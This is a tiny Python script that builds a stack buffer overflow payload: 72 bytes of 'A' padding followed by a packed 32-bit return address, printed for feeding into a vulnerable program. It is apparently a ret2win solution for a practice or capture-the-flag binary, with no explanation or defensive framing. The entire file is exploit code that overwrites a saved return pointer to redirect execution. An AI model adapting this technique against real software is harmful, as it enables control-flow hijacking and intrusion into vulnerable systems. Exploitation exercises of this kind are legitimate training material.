import struct

my_var = b"A" * 72
my_var += struct.pack("<I", 0x08048454)
print(my_var)